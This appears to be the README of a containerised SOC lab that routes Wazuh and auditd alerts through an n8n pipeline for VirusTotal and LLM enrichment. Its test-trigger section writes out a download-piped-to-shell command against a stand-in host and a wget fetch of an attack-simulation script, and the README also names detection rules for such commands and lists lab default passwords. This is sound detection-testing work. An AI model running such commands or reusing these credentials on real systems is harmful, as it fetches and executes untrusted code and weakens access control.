# 🛡️ Agentic SOC — Linux EDR + Wazuh + n8n "Always-Enrich" + Yarakin AI

A fully containerized **Security Operations Center lab**. A Linux endpoint (Wazuh
agent + auditd) and Windows victims generate telemetry; **Wazuh** detects and
forwards alerts to **n8n**, which runs an automated Tier-3 enrichment pipeline
(IOCs → timeline → VirusTotal → LLM verdict/MITRE/YARA → case written back to the
index). **Yarakin** (an AI analyst toolbox) rounds out the agentic layer.

Everything is Docker and talks by service name on shared networks — no hardcoded IPs.

---

## ⚠️ Read this first: the repo vs. the running lab

This repo contains the **packaged, single-stack** definition (`docker-compose.yml`
+ `generate-certs.yml` + `bootstrap.sh`) that boots the whole lab from one project.
In practice the live lab is currently run as **four separate compose projects** that
share the `single-node_default` Docker network, which is how it's wired on the host
today:

| Compose project | Path on host | Provides |
|---|---|---|
| `single-node` | `/home/dev/PROJECT/wazuh-docker/single-node` | Wazuh manager + indexer + dashboard (4.9.0) |
| `n8n` | `/home/dev/soc-lab/n8n` | n8n orchestration (the "Always-Enrich" pipeline) |
| `linux-agent-test` | `/home/dev/soc-lab/linux-agent-test` | Linux EDR endpoint (`soc-linux-test`) |
| `yarakin` | `/home/dev/PROJECT/DeepSeek/yarakin` | Yarakin AI analyst toolbox (web :8501) |

The files in **this** repo (`config/`, `endpoint/`, `n8n/workflows/`, `windows-ar/`)
are the source-of-truth configs and scripts. The Cold Start section below documents
**both** the packaged single-stack boot and the split multi-project boot actually in
use, so the lab can be rebuilt from either.

> **Falco** is defined in this repo's `docker-compose.yml` but is **not currently
> running** in the live lab (behavioral detection is currently covered by auditd +
> Wazuh custom rules on the Linux endpoint).

---

## Architecture

```
linux-endpoint (Wazuh agent + auditd)   ──1514/1515──▶  wazuh.manager
windows-victims (SOC-Victim / win11)     ──1514/1515──▶  wazuh.manager
                                                     │
        wazuh.manager ──custom-n8n integration──▶ n8n :5678/webhook/soc-alert
                                                     │
        wazuh.indexer (OpenSearch, :9200)            ▼
              ▲                          Extract IOCs → Timeline → VirusTotal
              │                          → Merge → Tier-3 LLM → Score → Switch
              │                          → Write case to agentic-soc-cases
              └──────────────────────────  alerts + cases stored here
                                               │
                                          Yarakin (:8501) — AI analyst UI
```

**Detection → enrichment chain**
1. Endpoint/FIM/auditd events → Wazuh manager.
2. Manager integration `custom-n8n` fires on alerts `level >= 10` → POSTs to the
   n8n webhook `http://n8n:5678/webhook/soc-alert`.
3. n8n workflow ("Agentic") extracts IOCs, pulls the Wazuh timeline, enriches via
   VirusTotal, merges intel, calls the Tier-3 LLM (OpenRouter) for verdict /
   malware-family / MITRE ATT&CK / YARA, scores, and writes a case document to the
   `agentic-soc-cases*` index in OpenSearch.
4. Cases are visible in the Wazuh Dashboards UI and via Yarakin.

---

## Features

| Capability | Implementation |
|---|---|
| FIM | Wazuh `syscheck` on `/home/victim/{Downloads,Desktop}` + `/tmp` (sha256, realtime) |
| Behavioral EDR (Linux) | auditd command monitoring (curl\|sh, gcore / `/proc/*/mem`) |
| Download-to-shell | custom rule 100015 (curl\|sh / wget\|bash) |
| n8n enrichment | webhook → Extract IOCs → Timeline → VirusTotal → Merge → Tier-3 LLM → Score → Write-back |
| LLM analyst | OpenRouter (verdict / malware_family / MITRE / YARA) |
| Active response | `soc-quarantine.sh` moves offending file to `/quarantine` |
| Windows victims | Windows 11 test VMs (SOC-Victim / win11-victim) with Wazuh agent + attack-chain scripts (`windows-ar/`) |
| AI analyst UI | Yarakin toolbox on :8501 |

---

## Current status (live lab, verified)

See **[STATUS.md](STATUS.md)** for the detailed write-up. TL;DR:

- ✅ Wazuh manager / indexer / dashboard — **UP** (4.9.0)
- ✅ n8n — **UP**, workflows "Agentic" (Active) + "YARAKIN Sample Intake" (Active)
- ✅ Yarakin AI toolbox — **UP** on :8501
- ✅ Linux EDR endpoint (`soc-linux-test`) — **ACTIVE**, FIM scanning
- ✅ Alert pipeline flowing — ~1,514 alerts in last 24h, ~8,293 total indexed
- ⚠️ Windows victims (001 `win11-victim`, 002 `SOC-Victim`) — **DISCONNECTED** (VMs off)
- ⚠️ Falco — not running in the live lab
- ⚠️ Wazuh REST `/alerts` endpoint 404s on query (known version-specific quirk; alerts
  are confirmed flowing via the indexer, so this is cosmetic)

---

## Quick start — packaged single-stack

```bash
cp .env.example .env          # set N8N_ENCRYPTION_KEY, VT_API_KEY, OPENROUTER_API_KEY
chmod +x bootstrap.sh
./bootstrap.sh                # generates certs, builds + starts the stack
```

Open:
- Wazuh Dashboard: **https://localhost** (admin / `INDEXER_PASSWORD`)
- n8n: **http://localhost:5678**
- OpenSearch API: **https://localhost:9200**
- Yarakin: **http://localhost:8501**

> The packaged stack expects certs under `config/wazuh_indexer_ssl_certs/` (created
> by `generate-certs.yml` on first `bootstrap.sh` run) and the Linux endpoint built
> from `endpoint/Dockerfile`. It joins all services on a single `soc` network.

---

## Cold start — the split multi-project lab (how it actually runs)

Rebuild the running topology from the four compose projects. Run each in its own
directory; the endpoint + n8n join the Wazuh `single-node_default` network.

```bash
# 1) Wazuh single-node (manager + indexer + dashboard)
cd /home/dev/PROJECT/wazuh-docker/single-node
docker compose up -d

# 2) n8n (joins the same Docker network as Wazuh)
cd /home/dev/soc-lab/n8n
docker compose up -d

# 3) Linux EDR endpoint — its client.key is volume-mounted from
#    ./agent-client.keys so it re-enrolls to wazuh.manager automatically.
cd /home/dev/soc-lab/linux-agent-test
docker compose up -d --build

# 4) Yarakin AI analyst toolbox
cd /home/dev/PROJECT/DeepSeek/yarakin
docker compose up -d
```

Verify:
```bash
# Wazuh API (JWT)
TOKEN=$(curl -sk -u wazuh-wui:'MyS3cr37P450r.*-' \
  -X POST https://localhost:55000/security/user/authenticate \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")
curl -sk -H "Authorization: Bearer $TOKEN" https://localhost:55000/agents

# n8n health
curl -s http://localhost:5678/healthz

# Endpoint enrollment (expect agent 010 soc-linux-test = active)
docker exec single-node-wazuh.manager-1 /var/ossec/bin/agent_control -l
```

Import the n8n workflow (only needed once / on fresh n8n data volume):
- n8n UI → **Workflows → Import from File** → select `n8n/workflows/always-enrich.json`.
- Set credentials in n8n: **VirusTotal API key** and **OpenRouter API key**
  (also configurable via `.env` / n8n Env for `VT_API_KEY`, `OPENROUTER_API_KEY`).
- Activate the workflow; its webhook listens at `POST /webhook/soc-alert`.

### Windows victims (optional)
From a Windows 11 test VM, use the scripts under `windows-ar/`:
- `SOC-SETUP.bat` / `soc-setup.ps1` — install + enroll the Wazuh agent.
- `RUN-V3-INSTALL.bat`, `install-fetch-scripts.ps1`, `soc-fetch-sample.*` — sample
  fetch / attack-chain launchers. These need to be run **as Administrator** (the
  scripts self-elevate; guestcontrol over UAC is not available).

---

## Test triggers (Linux endpoint)

```bash
docker exec -it soc-linux-test bash

# EICAR (FIM rule, benign verdict)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  > /home/victim/Downloads/eicar.txt

# Download piped to shell (rule 100015, malicious)
curl -s https://example.com/x.sh | bash

# Suspicious fetch (rule 100013)
wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.sh -O /tmp/t.sh
```

Watch cases appear in `agentic-soc-cases*` (OpenSearch) and the Wazuh dashboard.

---

## Project layout

```
docker-compose.yml                 # packaged single-stack (all-in-one)
generate-certs.yml                 # one-shot Wazuh TLS cert generator
bootstrap.sh                       # certs + build + up
config/
  manager/ossec.conf               # persistent manager config (integration + AR)
  manager/local_rules.xml          # EDR detection rules (100012–100030)
  manager/custom-n8n               # integration → n8n webhook
  manager/soc-quarantine.sh        # active-response script
  manager/ar.conf                  # active-response shared config
  manager/patches/wazuh-control    # glibc patch (drops legacy wazuh-dbd)
  wazuh_indexer/  wazuh_dashboard/ # indexer + dashboard config
  falco/                          # Falco behavioral rules (optional)
  certs.yml
endpoint/                          # Linux endpoint image (Wazuh agent + auditd)
n8n/workflows/always-enrich.json   # the n8n "Always-Enrich" pipeline (source of truth)
windows-ar/                        # Windows victim setup + attack-chain scripts
STATUS.md                          # current-state write-up
RESUME.md                          # end-of-session boot notes
```

---

## Default credentials (LAB ONLY — change before any real use)

| Service | User | Password |
|---|---|---|
| OpenSearch / indexer / dashboard | `admin` | `SecretPassword` |
| Wazuh manager API | `wazuh-wui` | `MyS3cr37P450r.*-` |
| Wazuh dashboard server | `kibanaserver` | `kibanaserver` |
| n8n webhook | — | `http://n8n:5678/webhook/soc-alert` (manager integration, level>=10) |

Secrets come from `.env` (gitignored). Never commit real keys — the example file
ships only lab defaults.

## Notes / gotchas
- Manager config (`ossec.conf`, rules, integration) is bind-mounted, so it **persists**
  across `docker compose down/up`.
- The `wazuh-control` patch drops the legacy `wazuh-dbd` daemon whose `-t` test aborts
  with a glibc assertion on kernel 6.8+/7.x. Without it the manager container won't start.
- Wazuh v15 Sysmon eventchannel on the Windows side only forwards EID 1 + 10 to Wazuh
  in this lab (EID 3/5/11/22 dropped); FIM covers file-create. This is a known lab
  limitation, not a misconfiguration.
- Licence: see `LICENSE` (MIT).

---

## Recent additions (2026-09)

### Bridge service (`bridge/`)
Python service that fetches samples from endpoints and forwards to YARAKIN.
- `POST /fetch` — pulls file from Linux container or VM, base64-encodes, POSTs to YARAKIN intake webhook
- `POST /stage` — same for active response workflows
- **Security**: path allowlist (`/testbed/`, `/tmp/`, `/var/tmp/`), shared-secret auth via `X-Bridge-Key` header, no path traversal
- **Config**: see `bridge/bridge.json` (sanitized) and `bridge/README.md`

### Custom SOC Dashboard (`dashboard/`)
FastAPI + WebSocket dashboard with:
- **Live view**: card-based case feed, filter chips, search
- **Incidents view**: auto-correlated clusters (agent + MITRE technique + 30min window)
- **Live activity feed**: real-time events from Wazuh, YARAKIN, case management
- **Case detail panel**: IOC, YARAKIN results, related cases, MITRE tags, YARA rule, timeline
- **Case management**: status transitions, assignment, comments (SQLite)
- **Endpoints**: `/api/cases`, `/api/incidents`, `/api/related`, `/api/activity`, `/api/health`, `/ws` WebSocket

### n8n workflows (`n8n-workflows/`)
- **Agentic** (`RlieZMswNK89cCYK`) — main Tier-3 pipeline
- **YARAKIN Sample Intake** (`yrkSampleIntake01`) — file upload + analysis
- Secrets redacted in exported JSON
